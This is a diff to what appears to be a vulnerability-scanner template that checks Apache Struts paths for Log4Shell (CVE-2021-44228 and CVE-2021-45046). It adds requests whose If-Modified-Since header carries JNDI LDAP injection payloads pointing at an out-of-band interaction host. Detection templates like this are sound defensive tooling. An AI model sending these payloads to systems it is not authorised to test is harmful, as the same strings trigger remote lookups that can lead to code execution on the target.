@@ -20,6 +20,15 @@ requests:
       - "{{BaseURL}}/static/xhtml/styles.css"
     headers:
        User-Agent: Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36
+       If-Modified-Since: ${jndi:ldap://{{Host}}.{{interactsh-url}}}
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/struts/utils.js"
+      - "{{BaseURL}}/index.action/struts/utils.js"
+      - "{{BaseURL}}/static/xhtml/styles.css"
+    headers:
+       User-Agent: Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36
        If-Modified-Since: ${jndi:ldap://127.0.0.1#{{Host}}.{{interactsh-url}}}  #CVE-2021-45046
 
     matchers-condition: and
